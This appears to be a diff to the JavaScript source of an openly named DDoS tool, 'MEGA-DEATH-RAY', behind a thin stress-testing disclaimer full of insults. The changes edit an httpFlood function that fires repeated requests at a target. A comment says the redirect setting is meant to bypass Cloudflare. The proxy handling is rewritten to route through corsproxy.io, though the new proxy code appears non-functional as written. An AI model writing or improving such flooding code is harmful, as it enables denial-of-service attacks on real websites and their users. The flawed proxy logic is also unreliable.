@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.4)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.5)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -194,6 +194,7 @@ function logAction(message) {
     const newLog = document.createElement('li');
     newLog.textContent = message;
     logList.appendChild(newLog);
+    console.log("Noodles Inc: " + message); // Log to console as well
 }
 
 function updateProxies() {
@@ -240,20 +241,16 @@ async function httpFlood(url, hexBytes, proxy) {
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
-            proxy: proxy, // Use proxy server if provided
         };
-		if (proxy) {
-            const proxyParts = proxy.split(':');
-            if (proxyParts.length === 2) {
-                const proxyHost = proxyParts[0];
-                const proxyPort = parseInt(proxyParts[1]);
 
-                // Check if the proxy is an HTTP proxy
-                if (!isNaN(proxyPort) && proxyPort > 0 && proxyPort <= 65535) {
-					fetchOptions.proxy = `http://${proxyHost}:${proxyPort}`;
-				}
-			}
-		}
+        // Proxy integration using an external service (e.g., CORSproxy)
+        if (proxy) {
+            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`
+            fetchOptions.proxy = proxyUrl;  // Use CORSproxy to forward the request
+            console.log(`Using proxy: ${proxy} through CORSproxy`);
+            logAction(`Using proxy: ${proxy} through CORSproxy`);
+
+        }
         const response = await fetch(url, fetchOptions);
 
         clearTimeout(timeoutId);
@@ -263,6 +260,7 @@ async function httpFlood(url, hexBytes, proxy) {
             await response.text();
         } catch (e) {
             console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
+            logAction(`Noodles Inc: Could not read response body (likely opaque). ${e}`);
         }
 
         console.log('Noodles Inc: Request sent successfully. Status:', response.status);
